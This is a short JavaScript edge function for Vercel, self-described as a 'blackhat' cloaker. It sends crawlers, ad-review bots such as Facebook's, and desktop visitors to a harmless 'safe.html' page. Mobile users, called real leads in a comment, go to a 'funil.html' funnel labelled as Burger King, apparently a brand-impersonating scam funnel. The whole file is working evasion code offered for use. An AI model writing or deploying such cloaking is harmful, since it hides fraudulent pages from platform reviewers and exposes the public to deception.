/**
 * ==========================================
 * 🛡️ CLOAKER EDGE (VERCEL X-CLOAK) 🛡️
 * ==========================================
 */

export const config = {
  runtime: 'edge'
};

export default function (req) {
  const url = new URL(req.url);
  const ua = req.headers.get('user-agent')?.toLowerCase() || '';
  
  const isMobile = /android|iphone|ipod|ipad|windows phone|blackberry/.test(ua);
  const isBot = /bot|crawl|spider|facebookexternalhit|facebot|google|bing|slurp|duckduckbot|baiduspider|yandex|sogou|exabot|ahrefs|mj12bot|semrush/.test(ua);

  // 1. FILTRO DE CLOAKING (Blackhat Level 7)
  if (!isMobile || isBot) {
    url.pathname = '/safe.html';
    return Response.redirect(url);
  }

  // 2. LEAD REAL EM DISPOSITIVO MÓVEL → Vai para o Funil Burger King
  url.pathname = '/funil.html';
  return Response.redirect(url);
}
